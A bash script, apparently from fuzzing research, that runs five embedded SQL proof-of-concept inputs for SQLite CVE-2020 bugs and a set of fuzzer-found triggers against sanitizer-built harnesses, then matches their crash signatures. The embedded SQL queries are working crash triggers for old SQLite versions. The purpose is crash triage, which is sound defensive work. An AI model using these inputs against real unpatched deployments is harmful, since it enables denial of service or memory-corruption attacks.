#!/bin/bash
# verify_cve_mapping.sh — Run every BC trigger and every CVE PoC against
# test harnesses, extract crash signatures, and compare.
# Output: a truth table showing which BCs match which CVEs.
set -euo pipefail

ROOT="$(cd "$(dirname "$0")/.." && pwd)"
CRASHES="$ROOT/results/crashes_v33_fresh"
HARNESS_DIR="$ROOT/harness/test"
TMPDIR=$(mktemp -d)
trap "rm -rf $TMPDIR" EXIT

# ── 1. Extract CVE PoCs from cve-list.md ──────────────────────────────
cat > "$TMPDIR/cve_13434.sql" << 'EOF'
SELECT printf('%.*g', 2147483647, 0.01);
EOF

cat > "$TMPDIR/cve_9327.sql" << 'EOF'
CREATE TABLE v0(v3, v1 AS(v1) UNIQUE);
CREATE TABLE v5(v6 UNIQUE, v7 UNIQUE);
CREATE VIEW v8(v9) AS SELECT coalesce(v3, v1) FROM v0 WHERE v1 IN('MED BOX');
SELECT * FROM v8 JOIN v5 WHERE 0 > v7 AND v9 OR v6 = 's%';
EOF

cat > "$TMPDIR/cve_13435.sql" << 'EOF'
CREATE TABLE a(c UNIQUE);
SELECT a.c FROM a JOIN a b ON 3 = a.c NATURAL JOIN a
  WHERE a.c IN((SELECT(SELECT coalesce(lead(2) OVER(), SUM(c))) FROM a d WHERE a.c));
EOF

cat > "$TMPDIR/cve_13871.sql" << 'EOF'
CREATE TABLE a(b);
SELECT(SELECT b FROM a GROUP BY b HAVING(NULL AND b IN(
  (SELECT COUNT() OVER(ORDER BY b) = lead(b) OVER(ORDER BY 3.100000
  * SUM(DISTINCT CASE WHEN b LIKE 'SM PACK' THEN b * b ELSE 0 END) / b)))))
FROM a EXCEPT SELECT b FROM a ORDER BY b, b, b;
EOF

cat > "$TMPDIR/cve_15358.sql" << 'EOF'
CREATE TABLE t1(c1); INSERT INTO t1 VALUES(12),(123),(1234),(NULL),('abc');
CREATE TABLE t2(c2); INSERT INTO t2 VALUES(44),(55),(123);
CREATE TABLE t3(c3,c4); INSERT INTO t3 VALUES(66,1),(123,2),(77,3);
CREATE VIEW t5 AS SELECT c3 FROM t3 ORDER BY c4;
SELECT * FROM t1, t2
  WHERE c1=(SELECT 123 INTERSECT SELECT c2 FROM t5) AND c1=123;
EOF

# ── 2. Collect BC trigger files ───────────────────────────────────────
declare -A BC_FILES
for bcdir in "$CRASHES"/BC*_*/; do
    bcname=$(basename "$bcdir" | grep -oP '^BC\d+')
    hashdir=$(find "$bcdir" -mindepth 1 -maxdepth 1 -type d | head -1)
    if [ -n "$hashdir" ] && [ -f "$hashdir/trigger.sql" ]; then
        BC_FILES[$bcname]="$hashdir/trigger.sql"
    fi
done

# ── 3. Run a SQL file against a harness, return crash signature ───────
# Signature = "function:line" from first UBSan/ASan line, or "SEGV", or "OK"
get_crash_sig() {
    local harness="$1" sqlfile="$2"
    local out
    out=$(timeout 5 "$harness" "$sqlfile" 2>&1 || true)
    local ec=$?

    # UBSan: extract file:line
    local ubsan_line=$(echo "$out" | grep -oP 'sqlite3\.c:\K\d+' | head -1)
    local ubsan_func=$(echo "$out" | grep -oP '(?:in |Stack: )\K\w+' | head -1)
    local ubsan_type=$(echo "$out" | grep -oP 'runtime error: \K[^:]+' | head -1)

    # ASan: heap-use-after-free etc
    local asan_type=$(echo "$out" | grep -oP 'ERROR: AddressSanitizer: \K\S+' | head -1)
    local asan_func=$(echo "$out" | grep -oP '#0 .* in \K\w+' | head -1)

    if [ -n "$asan_type" ]; then
        echo "ASAN:${asan_type}:${asan_func}:L${ubsan_line:-?}"
    elif [ -n "$ubsan_line" ]; then
        echo "UBSAN:${ubsan_type}:${ubsan_func:-?}:L${ubsan_line}"
    elif [ -z "$out" ] && [ $ec -gt 128 ]; then
        echo "SIGNAL:$((ec-128))"
    elif [ -z "$out" ]; then
        echo "OK"
    else
        echo "OTHER:$(echo "$out" | head -1 | cut -c1-60)"
    fi
}

# ── 4. Test versions ──────────────────────────────────────────────────
VERSIONS=(3.30.1 3.31.1 3.32.0 3.32.2)

echo "================================================================"
echo "  CVE ↔ BC MAPPING VERIFICATION"
echo "  $(date)"
echo "================================================================"
echo ""

# ── 5. Run all CVE PoCs ──────────────────────────────────────────────
echo "╔══════════════════════════════════════════════════════════════╗"
echo "║  PART 1: CVE PoC crash signatures                         ║"
echo "╚══════════════════════════════════════════════════════════════╝"
echo ""

declare -A CVE_SIGS
for cve in 13434 9327 13435 13871 15358; do
    sqlfile="$TMPDIR/cve_${cve}.sql"
    printf "CVE-2020-%-6s" "$cve"
    for ver in "${VERSIONS[@]}"; do
        harness="$HARNESS_DIR/sqlite_harness_sqlite-${ver}_test"
        if [ -f "$harness" ]; then
            sig=$(get_crash_sig "$harness" "$sqlfile")
            printf "  %s=%s" "$ver" "$sig"
            if [ "$sig" != "OK" ]; then
                CVE_SIGS["${cve}_${ver}"]="$sig"
            fi
        fi
    done
    echo ""
done

echo ""
echo "╔══════════════════════════════════════════════════════════════╗"
echo "║  PART 2: BC trigger crash signatures                       ║"
echo "╚══════════════════════════════════════════════════════════════╝"
echo ""

declare -A BC_SIGS
for bc in $(echo "${!BC_FILES[@]}" | tr ' ' '\n' | sort); do
    sqlfile="${BC_FILES[$bc]}"
    printf "%-7s" "$bc"
    for ver in "${VERSIONS[@]}"; do
        harness="$HARNESS_DIR/sqlite_harness_sqlite-${ver}_test"
        if [ -f "$harness" ]; then
            sig=$(get_crash_sig "$harness" "$sqlfile")
            printf "  %s=%s" "$ver" "$sig"
            if [ "$sig" != "OK" ]; then
                BC_SIGS["${bc}_${ver}"]="$sig"
            fi
        fi
    done
    echo ""
done

echo ""
echo "╔══════════════════════════════════════════════════════════════╗"
echo "║  PART 3: MATCH MATRIX — does BC sig == CVE sig?            ║"
echo "╚══════════════════════════════════════════════════════════════╝"
echo ""
echo "Match = same crash line number on the same version."
echo ""

printf "%-7s" ""
for cve in 13434 9327 13435 13871 15358; do
    printf "  %-14s" "CVE-$cve"
done
echo ""
echo "------------------------------------------------------------------------"

for bc in $(echo "${!BC_FILES[@]}" | tr ' ' '\n' | sort); do
    printf "%-7s" "$bc"
    for cve in 13434 9327 13435 13871 15358; do
        match="---"
        for ver in "${VERSIONS[@]}"; do
            cve_sig="${CVE_SIGS["${cve}_${ver}"]:-}"
            bc_sig="${BC_SIGS["${bc}_${ver}"]:-}"
            if [ -n "$cve_sig" ] && [ -n "$bc_sig" ]; then
                # Extract line numbers
                cve_line=$(echo "$cve_sig" | grep -oP 'L\K\d+')
                bc_line=$(echo "$bc_sig" | grep -oP 'L\K\d+')
                if [ -n "$cve_line" ] && [ -n "$bc_line" ] && [ "$cve_line" = "$bc_line" ]; then
                    match="MATCH($ver)"
                    break
                fi
            fi
        done
        printf "  %-14s" "$match"
    done
    echo ""
done

echo ""
echo "╔══════════════════════════════════════════════════════════════╗"
echo "║  PART 4: FINAL RECOMMENDED MAPPING                        ║"
echo "╚══════════════════════════════════════════════════════════════╝"
echo ""
echo "Based on crash line matching above:"
echo ""

for bc in $(echo "${!BC_FILES[@]}" | tr ' ' '\n' | sort); do
    matched_cve="---"
    matched_ver=""
    for cve in 13434 9327 13435 13871 15358; do
        for ver in "${VERSIONS[@]}"; do
            cve_sig="${CVE_SIGS["${cve}_${ver}"]:-}"
            bc_sig="${BC_SIGS["${bc}_${ver}"]:-}"
            if [ -n "$cve_sig" ] && [ -n "$bc_sig" ]; then
                cve_line=$(echo "$cve_sig" | grep -oP 'L\K\d+')
                bc_line=$(echo "$bc_sig" | grep -oP 'L\K\d+')
                if [ -n "$cve_line" ] && [ -n "$bc_line" ] && [ "$cve_line" = "$bc_line" ]; then
                    matched_cve="CVE-2020-$cve"
                    matched_ver="$ver"
                fi
            fi
        done
    done
    printf "  %-7s → %-16s %s\n" "$bc" "$matched_cve" "$matched_ver"
done

echo ""
echo "Done."
